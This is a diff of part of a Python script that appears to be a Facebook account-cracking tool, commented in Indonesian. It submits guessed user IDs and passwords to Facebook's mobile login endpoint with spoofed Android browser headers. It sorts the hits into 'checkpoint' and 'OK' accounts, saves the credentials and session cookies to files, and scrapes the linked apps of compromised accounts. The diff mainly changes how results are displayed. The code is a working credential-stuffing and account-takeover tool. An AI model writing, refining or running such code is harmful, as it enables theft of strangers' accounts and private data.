+    'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=678756043864316&kid_directed_site=0&app_id=678756043864316&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D678756043864316%26redirect_uri%3Dhttps%253A%252F%252Faccounts.livechat.com%252Foauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3D8f705f98-9254-4132-b385-8e242a1d26b0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2cde0d4-1d2b-4670-b977-fdd0f7be9bdb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.livechat.com%2Foauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D8f705f98-9254-4132-b385-8e242a1d26b0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+    'x-asbd-id': '198387',
+    'x-fb-lsd': 'AVp2LubqSL8',
+}
+			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=678756043864316&auth_token=2bc27f87513a2a8aa8d6764e6c83a56b&skip_api_login=1&signed_next=1&next=https://m.facebook.com/v3.2/dialog/oauth?client_id=678756043864316&redirect_uri=https%3A%2F%2Faccounts.livechat.com%2Foauth%2Ffacebook%2Fcallback&scope=email&state=8f705f98-9254-4132-b385-8e242a1d26b0&ret=login&fbapp_pres=0&logger_id=f2cde0d4-1d2b-4670-b977-fdd0f7be9bdb&tp=unspecified&refsrc=deprecated&app_id=678756043864316&cancel=https://accounts.livechat.com/oauth/facebook/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=8f705f98-9254-4132-b385-8e242a1d26b0#_=_&lwv=100',data=data,headers=headers,allow_redirects=True)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
 				cp+=1
+				akun.append(idf+'|'+pw)
+				tree= Tree(f"[[b red]+[white]] AKUN CP ",guide_style="bold grey100")
+				tree.add(f"[[b red]+[white]][bold yellow]{idf} | {pw}")
+				tree.add(f"[[b red]+[white]][bold blue]{ua}")
+				cetak(tree)
+				pen('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
-				user=idf
-				infoakun = ""
-				session = requests.Session()
-				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
-				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
-				nok=1
-				for muncul in apkaktif:
-					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
-					nok+=1
+				if 'no' in taplikasi:
+					ok+=1
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					tree= Tree(f"                                                                           ")
+					tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
+					cetak(tree)
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				elif 'ya' in taplikasi:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					user=idf
+					infoakun = ""
+					session = requests.Session()
+					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
+					nok=1
+					for muncul in apkaktif:
+						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
+						nok+=1
 
-				hit=0
-				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
-				hit=0
-				for muncul in apkexp:
-					hit+=1
-					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
-				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
-				ok+=1
-				break
+					hit=0
+					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
+					hit=0
+					for muncul in apkexp:
+						hit+=1
+						ok+=1
+						infoakun += (f"{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
+					tree= Tree(f"                                                                           ")
+					tree.add(f"\r[bold green]{idf} | {pw}")
+					tree.add(f"\r [white]Cookie [bold green]{kuki}").add(f"[white] {infoakun}")
+					cetak(tree)
+					#os.popen('play-audio data/ok.mp3')
+					
+					break
 
 			else:
 				continue
